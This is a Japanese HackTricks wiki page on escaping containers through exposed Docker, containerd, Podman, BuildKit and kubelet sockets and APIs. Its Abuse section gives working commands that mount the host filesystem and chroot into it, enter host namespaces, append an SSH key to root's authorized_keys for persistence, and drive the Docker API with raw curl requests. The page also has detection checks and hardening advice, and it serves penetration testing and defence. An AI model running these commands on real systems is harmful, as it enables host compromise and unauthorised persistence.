# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

実際のコンテナ侵害の多くは、namespace escapeから始まるわけではありません。runtime control planeへのアクセスから始まります。workloadが、マウントされたUnix socketや公開されたTCP listenerを介して`dockerd`、`containerd`、CRI-O、Podman、またはkubeletと通信できる場合、攻撃者はより強力な権限を持つ新しいコンテナの作成、host filesystemのマウント、host namespaceへの参加、または機密性の高いnode情報の取得を要求できる可能性があります。このような場合、runtime APIが実際のsecurity boundaryであり、これを侵害することは機能的にはhostを侵害することに近い状態です。

このため、runtime socket exposureはkernel protectionsとは別に文書化する必要があります。通常のseccomp、capabilities、MAC confinementを使用しているコンテナでも、`/var/run/docker.sock`や`/run/containerd/containerd.sock`が内部にmountされていれば、host compromiseまでAPI call 1回で到達できる可能性があります。現在のコンテナのkernel isolationが設計どおりに機能していても、runtime management planeは完全に公開されたままになり得ます。

## Daemon Access Models

Docker Engineは従来、local Unix socketの`unix:///var/run/docker.sock`を介してprivileged APIを公開しています。過去には、`tcp://0.0.0.0:2375`のようなTCP listenerや、TLSで保護された`2376`のlistenerを介してremoteに公開されることもありました。強力なTLSとclient authenticationなしでdaemonをremoteに公開すると、実質的にDocker APIがremote root interfaceになります。

containerd、CRI-O、Podman、kubeletも同様に影響の大きいattack surfaceを公開しています。名称やworkflowは異なりますが、logicは同じです。interfaceによってcallerがworkloadの作成、host pathのmount、credentialの取得、または実行中のコンテナの変更を行える場合、そのinterfaceはprivileged management channelであり、それに応じて扱う必要があります。

確認すべき一般的なlocal pathは次のとおりです。
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
古い、またはより特殊な stack では、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などの endpoint も公開される場合があります。これらは現代の環境ではあまり一般的ではありませんが、遭遇した場合は、通常のアプリケーション socket ではなく runtime-control surface を表すため、同じように注意して扱う必要があります。

## Secure Remote Access

daemon を local socket の外部に公開する必要がある場合、接続は TLS で保護し、できれば mutual authentication を使用して、daemon が client を検証し、client が daemon を検証できるようにすべきです。利便性のために Docker daemon を plain HTTP で公開する古い習慣は、container administration における最も危険なミスの一つです。これは、API surface が privileged container を直接作成できるほど強力だからです。

歴史的な Docker の設定パターンは、次のようなものでした。
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd-based hosts では、daemon の通信が `fd://` として現れる場合もあります。これは、process が socket を自分で直接 bind するのではなく、systemd から pre-opened socket を継承することを意味します。重要なのは正確な syntax ではなく、security 上の影響です。daemon が厳格に permission を設定した local socket の範囲を超えて listen した時点で、transport security と client authentication は、任意の hardening ではなく必須になります。

## Abuse

runtime socket が存在する場合は、それがどの socket なのか、compatible client が存在するか、raw HTTP または gRPC access が可能かを確認します。:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
これらのコマンドが有用なのは、存在しないパス、マウントされているもののアクセスできない socket、そして稼働中の privileged API を区別できるためです。client が成功した場合、次に確認すべきなのは、その API で host の bind mount や host namespace sharing を使用して新しい container を起動できるかどうかです。

### Client がインストールされていない場合

`docker`、`podman`、または別の使いやすい CLI が存在しないからといって、socket が安全とは限りません。Docker Engine は Unix socket 上で HTTP を使用し、Podman は `podman system service` を通じて Docker-compatible API と Libpod-native API の両方を公開します。つまり、`curl` しかない最小限の環境でも、daemon を操作するには十分な場合があります。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
これは post-exploitation の際に重要です。defender が通常の client binaries を削除しても、management socket は mount されたまま残されることがあるためです。Podman hosts では、rootful と rootless の deployment で高価値な path が異なる点に注意してください。rootful service instances では `unix:///run/podman/podman.sock`、rootless の場合は `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### 完全な例: Docker Socket To Host Root

`docker.sock` に到達できる場合、古典的な escape は、host の root filesystem を mount した新しい container を起動し、その中で `chroot` する方法です。
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を通じて、host-root で直接実行する手段を提供します。影響はファイルの読み取りに限定されません。新しい container 内に入ると、攻撃者は host ファイルを変更し、認証情報を収集し、永続化を埋め込み、または追加の privileged workload を起動できます。

### 完全な例: Docker Socket To Host Namespaces

攻撃者が filesystem-only のアクセスではなく namespace entry を選択する場合:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路では、現在の container を exploit するのではなく、runtime に明示的な host-namespace exposure を持つ新しい container の作成を要求することで host に到達します。

### Docker Socket Persistence Pattern

Runtime control は、一度限りの shell ではなく persistence にも利用できます。一般的なパターンは、host mount を持つ helper container を作成し、mount された host filesystem に authorized access material または startup hook を書き込み、その後 host がそれを読み込むことを検証するというものです。

例の形:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
同じ考え方は、operator が何を証明したいかに応じて、systemd units、cron fragments、application startup files、または SSH keys を対象にできます。重要なのは、persistent change が元の container 内で追加の privilege を使って行われるのではなく、runtime daemon の host-level filesystem authority を通じて行われる点です。

### Raw Docker API Helper Pivot

Docker CLI がない場合でも、同じ host-mount helper flow を Unix socket 経由の HTTP で実行できます。一般的な flow は、API を確認し、host bind mount を持つ helper container を作成して起動し、exec instance を作成して起動するというものです。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最終的な `/exec/<id>/start` リクエストは返された exec ID に依存しますが、security point は正確な JSON の処理方法とは無関係です。rootful Docker daemon への raw API access だけで、より強力な helper workload を要求できます。

### 完全な例: containerd Socket

マウントされた `containerd` socket も、通常は同様に危険です。<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
より Docker ライクな client が存在する場合、`nerdctl` は `ctr` より便利です。これは、`--privileged`、`--pid=host`、`-v` などの使い慣れた flags を公開しているためです：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影響はここでもホスト侵害です。Docker-specific tooling が存在しない場合でも、別の runtime API が同じ管理権限を提供している可能性があります。Kubernetes ノードでは、`crictl` は CRI endpoint と直接通信するため、reconnaissance と container interaction に十分な場合もあります。

### BuildKit Socket

`buildkitd` は、単なる「build backend」と考えられがちなので見落としやすいものの、daemon は依然として privileged control plane です。アクセス可能な `buildkitd.sock` によって、攻撃者は arbitrary build steps の実行、worker capabilities の確認、侵害された環境の local contexts の使用、さらに daemon が許可するよう設定されている場合は `network.host` や `security.insecure` などの危険な entitlements の要求を行える可能性があります。

最初に行うと有用な操作は次のとおりです:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon が build requests を受け付ける場合、insecure entitlements が利用可能かどうかをテストします：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
影響の正確な範囲は daemon の設定によって異なりますが、permissive な entitlements を持つ rootful BuildKit service は、無害な開発者向けの利便性ではありません。特に CI runners や共有 build nodes では、別の高価値な管理用 attack surface として扱ってください。

### TCP 経由の Kubelet API

kubelet は container runtime ではありませんが、依然として node management plane の一部であり、同じ trust boundary の議論に含まれることがよくあります。kubelet の secure port `10250` に workload から到達可能な場合、または node credentials、kubeconfigs、proxy rights が露出している場合、attacker は Kubernetes API server の admission path に一切触れることなく、Pods を列挙したり、logs を取得したり、node-local containers で commands を実行したりできる可能性があります。

まずは低コストな discovery から始めます。
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet または API-server proxy path が `exec` を authorize している場合、WebSocket-capable client によって、node 上の他の container での code execution が可能になります。これが、`get` permission のみを持つ `nodes/proxy` が、見た目以上に危険である理由でもあります。この request は、commands を execute する kubelet endpoints に到達できます。また、これらの kubelet への直接的な interactions は、通常の Kubernetes audit logs には記録されません。<sup>[[2]](#references)</sup>

## 確認事項

これらの確認の目的は、container が trust boundary の外部に留めておくべき management plane に到達できるかどうかを判断することです。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
ここで注目すべき点：

- マウントされた runtime socket は、単なる情報開示ではなく、通常は直接的な管理プリミティブです。
- TLS なしで `2375` を listen している TCP listener は、remote compromise 状態として扱う必要があります。
- `DOCKER_HOST` などの環境変数から、workload が host の runtime と通信するよう意図的に設計されていたことが分かる場合があります。

## Runtime のデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの挙動 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトではローカル Unix socket | `dockerd` はローカル socket で listen し、daemon は通常 rootful | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` での TLS の弱さまたは欠如 |
| Podman | デフォルトでは daemonless CLI | 通常のローカル利用に長期間稼働する privileged daemon は不要。ただし `podman system service` を有効にすると API socket が公開される場合がある | `podman.sock` の公開、service の広範な実行、rootful API の使用 |
| containerd | ローカルの privileged socket | 管理 API はローカル socket 経由で公開され、通常は higher-level tooling から利用される | `containerd.sock` のマウント、広範な `ctr` または `nerdctl` access、privileged namespace の公開 |
| CRI-O | ローカルの privileged socket | CRI endpoint は node-local の信頼されたコンポーネント向け | `crio.sock` のマウント、CRI endpoint の untrusted workload への公開 |
| Kubernetes kubelet | node-local の管理 API | Kubelet は Pods から広範囲に到達可能にすべきではない。認証と認可によっては、access により pod state、credentials、execution features が公開される場合がある | kubelet socket または cert のマウント、弱い kubelet auth、host networking と到達可能な kubelet endpoint の組み合わせ |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
